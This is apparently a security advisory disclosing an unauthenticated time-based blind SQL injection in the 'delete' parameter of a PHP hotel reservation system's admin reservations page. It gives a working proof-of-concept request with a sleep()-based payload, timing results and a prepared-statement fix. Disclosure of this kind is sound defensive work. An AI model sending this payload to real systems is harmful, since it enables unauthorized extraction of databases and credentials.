# SQL Injection in Hotel and Tourism Reservation System PHP 1.0 — /admin/reservations.php

## Affected Product Details
- **Product:** Hotel and Tourism Reservation In PHP
- **Version:** 1.0
- **Vendor:** https://code-projects.org/hotel-and-tourism-reservation-in-php-with-source-code/
- **Vulnerable File:** `/ht/admin/reservations.php`
- **Vulnerable Parameter:** `delete` (GET)
- **Authentication Required:** No
- **Attack Vector:** Remote
- **Vulnerability Type:** Time-based Blind SQL Injection (CWE-89)
- **CVSS v3.1 Score:** 7.5 (High)
- **CVSS v3.1 Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

## Proof of Concept

**Vulnerable Request:**
```http
GET /ht/admin/reservations.php?delete=(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'*/ HTTP/1.1
Host: TARGET
```

**Time-based Confirmation:**
```
sleep(0)  =>  0.010s
sleep(3)  =>  3.015s
sleep(6)  =>  6.008s
sleep(15) => 15.008s
```

## Impact
An unauthenticated remote attacker can enumerate the entire database, extract credentials and sensitive data, and potentially achieve full system compromise.

## Remediation
```php
$stmt = $conn->prepare("DELETE FROM reservations WHERE id=?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

## References
- https://owasp.org/www-community/attacks/SQL_Injection
- https://cwe.mitre.org/data/definitions/89.html
- https://code-projects.org/hotel-and-tourism-reservation-in-php-with-source-code/
